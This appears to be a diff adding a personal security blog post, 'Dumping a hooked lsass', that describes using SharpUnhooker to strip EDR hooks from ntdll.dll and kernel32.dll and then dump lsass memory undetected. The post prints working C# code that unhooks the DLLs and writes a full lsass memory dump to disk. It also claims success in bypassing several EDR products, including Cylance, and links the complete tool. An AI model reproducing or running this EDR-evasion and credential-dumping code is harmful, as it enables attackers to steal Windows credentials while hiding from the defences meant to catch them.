@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Dumping a hooked lsass // </title>
+    <link rel="shortcut icon" href="/avatar.jpg" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Roberto Reigada" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://roberreigada.github.io/css/main.min.d0d5e789342c857615103efe4c6661ea9f35c301bbc7c92e64ca476f0aabfcbb.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Dumping a hooked lsass"/>
+<meta name="twitter:description" content="As you all may already know, EDRs place hooks in many ntdll.dll functions (usually the ones abused by malware), including NtReadVirtualMemory, which means if we try to use, for example, mimikatz to read lsass process memory we will get blocked and also detected by the EDR. Same happens if we try to use the Windows API MiniDumpWriteDump as this function will call internally the ntdll.dll hooked function NtReadVirtualMemory.
+Fortunately, all we need to do in this case is bypassing the API hooking done by the EDR."/>
+
+    <meta property="og:title" content="Dumping a hooked lsass" />
+<meta property="og:description" content="As you all may already know, EDRs place hooks in many ntdll.dll functions (usually the ones abused by malware), including NtReadVirtualMemory, which means if we try to use, for example, mimikatz to read lsass process memory we will get blocked and also detected by the EDR. Same happens if we try to use the Windows API MiniDumpWriteDump as this function will call internally the ntdll.dll hooked function NtReadVirtualMemory.
+Fortunately, all we need to do in this case is bypassing the API hooking done by the EDR." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://roberreigada.github.io/posts/dumping_hooked_lsass/" />
+<meta property="article:published_time" content="2021-06-23T22:46:23+00:00" />
+<meta property="article:modified_time" content="2021-06-23T22:46:23+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://roberreigada.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Roberto Reigada" /></a>
+      <h1></h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+      </nav>
+      <p>Cybersec :&gt;</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/roberreigada" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/roberto-reigada/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Dumping a hooked lsass</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 23, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>As you all may already know, EDRs place hooks in many ntdll.dll functions (usually the ones abused by malware), including NtReadVirtualMemory, which means if we try to use, for example, mimikatz to read lsass process memory we will get blocked and also detected by the EDR. Same happens if we try to use the Windows API MiniDumpWriteDump as this function will call internally the ntdll.dll hooked function NtReadVirtualMemory.</p>
+<p>Fortunately, all we need to do in this case is bypassing the API hooking done by the EDR. There are multiple ways to do this but one of the simplest is making use of <a href="https://github.com/GetRektBoy724/SharpUnhooker">SharpUnhooker</a>.</p>
+<p>This project, created by GetRektBoy724, works the following way:</p>
+<ol>
+<li>It reads and copies the <code>.text section</code> of the original (in-disk) DLL using &ldquo;PE parser stuff&rdquo;</li>
+<li>It patches the <code>.text section</code> of the loaded DLL using <code>Marshal.Copy</code> and <code>NtProtectVirtualMemory</code> from D/Invoke (to changes the permission of the memory)</li>
+<li>It checks the patched in-memory DLL by reading it again and compare it with the original one to see if its correctly patched.</li>
+</ol>
+<p>By just using SharpUnhooker and the MiniDumpWriteDump function, I was able to bypass multiple EDRs and managed to dump the content of lsass without being detected. This is the code I used:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">SilentUnhooker(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>);
+SilentUnhooker(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>);
+String dumpFileName = Directory.GetCurrentDirectory() + <span style="color:#e6db74">&#34;\\&#34;</span> + <span style="color:#e6db74">&#34;lsass.dmp&#34;</span>;
+<span style="color:#66d9ef">if</span> (System.IO.File.Exists(dumpFileName))
+{
+	System.IO.File.Delete(dumpFileName);
+}
+IntPtr hFile = NativeMethods.CreateFile(dumpFileName, NativeMethods.EFileAccess.GenericWrite, NativeMethods.EFileShare.None, lpSecurityAttributes: IntPtr.Zero, dwCreationDisposition: NativeMethods.ECreationDisposition.CreateAlways, dwFlagsAndAttributes: NativeMethods.EFileAttributes.Normal, hTemplateFile: IntPtr.Zero);
+NativeMethods._MINIDUMP_TYPE dumpType = NativeMethods._MINIDUMP_TYPE.MiniDumpWithFullMemory;
+<span style="color:#66d9ef">var</span> proc = Process.GetProcessesByName(<span style="color:#e6db74">&#34;lsass&#34;</span>).FirstOrDefault();
+<span style="color:#66d9ef">var</span> exceptInfo = <span style="color:#66d9ef">new</span> NativeMethods.MINIDUMP_EXCEPTION_INFORMATION();
+<span style="color:#66d9ef">var</span> result = NativeMethods.MiniDumpWriteDump(proc.Handle, proc.Id, hFile, dumpType, <span style="color:#66d9ef">ref</span> exceptInfo, UserStreamParam: IntPtr.Zero, CallbackParam: IntPtr.Zero);
+<span style="color:#66d9ef">if</span> (result == <span style="color:#66d9ef">true</span>) {
+	Console.WriteLine(<span style="color:#e6db74">&#34;lsass process was successfully dumped in &#34;</span> + Directory.GetCurrentDirectory() + <span style="color:#e6db74">&#34;\\&#34;</span> + <span style="color:#e6db74">&#34;lsass.dmp&#34;</span>);
+}
+<span style="color:#66d9ef">else</span> {
+	Console.WriteLine(<span style="color:#e6db74">&#34;Error dumping lsass process&#34;</span>);
+}
+</code></pre></div><p>You can find the whole code I wrote <a href="https://github.com/roberreigada/LsassUnhooker">here</a></p>
+<h2 id="example-bypassing-cylance">Example bypassing Cylance</h2>
+<video class="video-shortcode" preload="auto" height="auto" width="1200" controls>
+    <source src="/videos/LsassUnhooker.mp4" type="video/mp4">
+    There should have been a video here but your browser does not seem
+    to support it.
+</video>
+
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
